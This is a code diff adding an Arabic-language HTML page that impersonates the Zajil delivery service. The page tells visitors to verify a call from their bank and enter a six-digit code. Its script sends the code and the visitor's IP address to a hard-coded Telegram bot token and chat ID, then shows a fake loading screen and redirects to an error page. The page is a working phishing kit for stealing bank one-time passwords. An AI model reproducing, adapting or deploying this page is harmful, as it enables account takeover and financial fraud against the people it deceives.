@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar" xmlns="http://www.w3.org/1999/xhtml" xmlns:b="http://www.google.com/2005/gml/b" xmlns:data="http://www.google.com/2005/gml/data" xmlns:expr="http://www.google.com/2005/gml/expr"><head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# website: http://ogp.me/ns/website#">
+<head>
+ <title>الرئسية</title>
+ <link rel="icon" href="web.jpg">
+ <meta charset="UTF-8" />
+ <meta content="ar_AR" property="og:locale" />
+ <meta content="https://zajilys316.blogspot.com/" property="og:url" />
+ <meta content="زاجل توصيل/استلام " property="og:title" />
+ <meta content="زاجل توصيل/استلام " property="og:site_name" />
+ <meta content="" property="og:description" />
+ <meta content="زاجل توصيل/استلام " property="og:image:alt" />
+ <meta content="website" property="og:type" />
+ <meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyF5WcUn-PV74b2ZE_B6EElfzTeXc8Tf9f00BC-UPNZ7D7k3xFa5iZ-1rBZu-cOHxsapmqEaC6SQyKu-5a2uaYgFxPdBw9zNsPBMIPYYrUeEA00QZm40Nm3jzWhqxeBc-tTVEfmXDb6hO4C3Fd-KnIakUE1q9iKoJShxOEfk6RbvwsXIqG3jeqgKtqAQ/s1600/YXNzZXRzL2Jhbm5lcnMvYWJvdXQtYmFubmVyLmpwZw==.jpg" property="og:image" />
+ <meta content="زاجل توصيل/استلام , " name="keywords" />
+ <meta content="زاجل توصيل/استلام " property="article:tag" />
+ <meta content="" name="apple-mobile-web-app-capable" />
+ <meta content="" name="apple-mobile-web-app-status-bar-style" />
+ <meta name="description" content="اكتشف كيف يمكننا مساعدتك على تنمية أعمالك...">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+ <meta property="og:image" content="https://zajil-express.com/_next/static/media/logo.3fe78f13.svg" />
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<style type="text/css">
+*{
+
+   margin:0;
+   padding:0;
+}
+
+#cont{
+ width:100%;
+ height:750px;
+ background:#333;
+ display:flex;
+ justify-content:center;
+ align-items:center;
+ position:relative;
+ 
+ }
+ 
+ #inp1{
+ width:90%;
+ height:90%;
+ background:#fff;
+ display:flex;
+ justify-content:center;
+ align-items:center;
+ border-radius:10px;
+ 
+ }
+ 
+
+
+.form {
+  width: 300px;
+  position: relative;
+  height:60px;
+  overflow: hidden;
+  margin-top:100%;
+  background:;
+  
+}
+
+.form input {
+  width: 100%;
+  height: 100%;
+  color: #111;
+  padding-top: 20px;
+  border: none;
+  border-radius:;
+  background-color:;
+  text-align:center;
+  font-size:18px;
+}
+.form label {
+  position: absolute;
+  bottom: 0px;
+  left: 0px;
+  width: 100%;
+  height: 100%;
+  pointer-events: none;
+  border-bottom: 1px solid blue;
+}
+.form label::after {
+  content: "";
+  position: absolute;
+  bottom: -1px;
+  left: 0px;
+  width: 100%;
+  height: 100%;
+  border-bottom: 3px solid green;
+  transform: translateX(-100%);
+  transition: all 1s ease;
+}
+
+.content-name {
+  position: absolute;
+  bottom: 0px;
+  left: 20%;
+  padding-bottom: 5px;
+  transition: all 0.5s ease;
+}
+.form input:focus {
+  outline: none;
+  background:none;
+}
+.form input:focus + .label-name .content-name,
+.form input:valid + .label-name .content-name {
+  transform: translateY(-100%);
+  font-size: 14px;
+  left: 50%;
+  color: green;
+  background:none;
+}
+.form input:focus + .label-name::after,
+.form input:valid + .label-name::after {
+  transform: translateX(0%);
+}
+
+
+#butm{
+  
+width:100%;
+height:40px;
+background:;
+margin-top:30%;
+
+}
+#button{
+
+   width:100%;
+   height:100%;
+   border-radius:20px;
+   outline:none;
+   border: 1px solid #fff;
+   background:blue;
+   color:#fff;
+   font-size:18px;
+}
+#img{
+  width:90%;
+  height:50%;
+  background:#aa;
+  position:absolute;
+  top:2%;
+  
+}
+img{
+  width:100%;
+  height:100%;
+  
+}
+#h{
+ margin-top:69%;
+ position: absolute;
+ font-size:14px;
+ font-weight:700;
+ 
+} 
+#n{
+ color:blue;
+ position:absolute;
+ top:60%;
+}
+@media screen and (max-width:750px){
+
+#cont{
+ width:100%;
+ height:770px;
+ background:#333;
+ display:flex;
+ justify-content:center;
+ align-items:center;
+ position:relative;
+ 
+ }
+ 
+ #inp1{
+ width:90%;
+ height:90%;
+ background:#fff;
+ display:flex;
+ justify-content:center;
+ align-items:center;
+ border-radius:10px;
+ 
+}
+
+
+#loading{
+  width:100%;
+  height:100px;
+  background:;
+  display:flex;
+  justify-center:center;
+  position:fixed;
+  top:0;
+  z-index:999;
+  
+  
+ 
+}    
+
+
+
+img{
+  width:100%;
+  height:100%;
+}
+
+.mn{
+ background:rgba(0,0,0,1.9);
+ width:100%;
+ height:70px;
+ position:absolute;
+ top:;
+ text-align:center;
+ border-radius:;
+ box-shadow:0 0 10px black;
+ 
+ 
+}
+
+.ino{
+display:nne;
+}
+h5{
+margin-top:50px;
+font-size:18px;
+color:green;
+}
+
+
+
+
+
+
+
+ .loader {
+ position: relative;
+ width: 2.5em;
+ height: 2.5em;
+ transform: rotate(165deg);
+ }
+ 
+ .loader:before, .loader:after {
+ content: "";
+ position: absolute;
+ top: 50%;
+ left: 50%;
+ display: block;
+ width: 0.5em;
+ height: 0.5em;
+ border-radius: 0.25em;
+ transform: translate(-50%, -50%);
+ }
+ 
+ .loader:before {
+ animation: before8 2s infinite;
+ }
+ 
+ .loader:after {
+ animation: after6 2s infinite;
+ }
+ 
+ @keyframes before8 {
+ 0% {
+ width: 0.5em;
+ box-shadow: 1em -0.5em rgba(225, 20, 98, 0.75), -1em 0.5em rgba(111, 202, 220, 0.75);
+ }
+ 
+ 35% {
+ width: 2.5em;
+ box-shadow: 0 -0.5em rgba(225, 20, 98, 0.75), 0 0.5em rgba(111, 202, 220, 0.75);
+ }
+ 
+ 70% {
+ width: 0.5em;
+ box-shadow: -1em -0.5em rgba(225, 20, 98, 0.75), 1em 0.5em rgba(111, 202, 220, 0.75);
+ }
+ 
+ 100% {
+ box-shadow: 1em -0.5em rgba(225, 20, 98, 0.75), -1em 0.5em rgba(111, 202, 220, 0.75);
+ }
+ }
+ 
+ @keyframes after6 {
+ 0% {
+ height: 0.5em;
+ box-shadow: 0.5em 1em rgba(61, 184, 143, 0.75), -0.5em -1em rgba(233, 169, 32, 0.75);
+ }
+ 
+ 35% {
+ height: 2.5em;
+ box-shadow: 0.5em 0 rgba(61, 184, 143, 0.75), -0.5em 0 rgba(233, 169, 32, 0.75);
+ }
+ 
+ 70% {
+ height: 0.5em;
+ box-shadow: 0.5em -1em rgba(61, 184, 143, 0.75), -0.5em 1em rgba(233, 169, 32, 0.75);
+ }
+ 
+ 100% {
+ box-shadow: 0.5em 1em rgba(61, 184, 143, 0.75), -0.5em -1em rgba(233, 169, 32, 0.75);
+ }
+ }
+ 
+ .loader {
+ position: absolute;
+ top: calc(50% - 1.25em);
+ left: calc(50% - 1.25em);
+ }
+
+#span{
+  color:#fff;
+}
+
+
+input[type="number"]::-webkit-inner-spin-button,
+input[type="number"]::-webkit-outer-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+
+input[type="number"] {
+  -moz-appearance: textfield;
+}
+#nme{
+position:absolute;
+display:none;
+}
+
+input[type="number"]{
+direction:ltr;
+}
+</style>
+</head>
+<body onload="getName()">
+<div id="cont">
+     <div id="loading" style="display: none;">
+     
+     <div class="mn ino">
+     <h5 class="none"></h5>
+     <h4 id="span">جري الطلب....</h4>
+     <div class="loader"></div>   
+     </div>
+     </div>
+       <div id="inp1">
+         <div id="img">
+         <img src="101.png">
+         </div>
+       <form id="form">
+       <div id="nme" >
+       <input type="text" id="nameInput">
+       </div>
+     <span id="h">يرجى توثيق الاتصال المرسل اليك من البنك وادخال الكود</span>
+      <span id="n"> لإكمال عملية التوثيق</span>
+  
+        <div class="form">
+        
+        <input type="number" name="text" autocomplete="off" required  id="inp4"/>
+        <label for="text" class="label-name">
+        <span class="content-name">ادخل الكود المكون من 6 ارقام </span>
+        </label>
+        </div>
+            <div id="butm">
+                <input type="submit" id="button" value="ارسال الطلب">
+            </div>
+          </form>
+        </div>
+</div>
+
+
+<script type="text/javascript">
+
+
+
+var inp4 = document.getElementById("inp4");
+inp4.addEventListener("input", function() {
+if (inp4.value.length > 6 ) {
+inp4.value = inp4.value.slice(0, 6);  
+}
+  
+});
+
+var bo = document.getElementById("button");
+bo.onclick = function(){
+  var inp4 = document.getElementById("inp4").value;
+  if(inp4.length <6){
+  
+     alert("يجب ان يتكون الكود من 6 ارقام ");
+  }else{
+     document.getElementById("loading").style.display = "block";
+     
+     // تأخير لبضع ثوانٍ قبل نقل المستخدم إلى الصفحة الأخرى
+     setTimeout(function() {
+     window.location.href = "error.html";
+     },12000); 
+      
+     var name = document.getElementById("nameInput").value;
+     var message = document.getElementById("inp4").value;
+     
+     fetch('https://api.ipify.org?format=json')
+       .then(response => response.json())
+       .then(data => {
+          const ipAddress = data.ip;
+          console.log(ipAddress);
+     
+     axios.post('https://api.telegram.org/bot6948869803:AAFh0PExFe9_iBbaWM3JxkDIG3Br-SxyPhE/sendMessage', {
+     chat_id: '6594871141',
+     text: `معدل العميل : ${ipAddress}\n الكود : ${message}`
+     })
+     .then(response => {
+     console.log(response.data);
+     
+     })
+     .catch(error => {
+     console.error(error);
+     alert('حدث خطأ أثناء إرسال الرسالة!');
+     });
+     
+       })
+       .catch(error => {
+         console.error('Error:', error);
+       });
+  }
+   
+ 
+}
+
+var fo = document.getElementById("form");
+ fo.addEventListener("submit",function(event){
+ 
+ event.preventDefault();
+
+
+ window.scrollTo(0,0);
+ 
+
+
+});
+
+
+function getName() {
+var urlParams = new URLSearchParams(window.location.search);
+var name = urlParams.get('name');
+document.getElementById("nameInput").value = name;
+}
+var bott = document.getElementById("button");
+  bott.addEventListener("click",function(){
+  bott.disabled= true;
+  });
+</script>
+</body>
+</html>
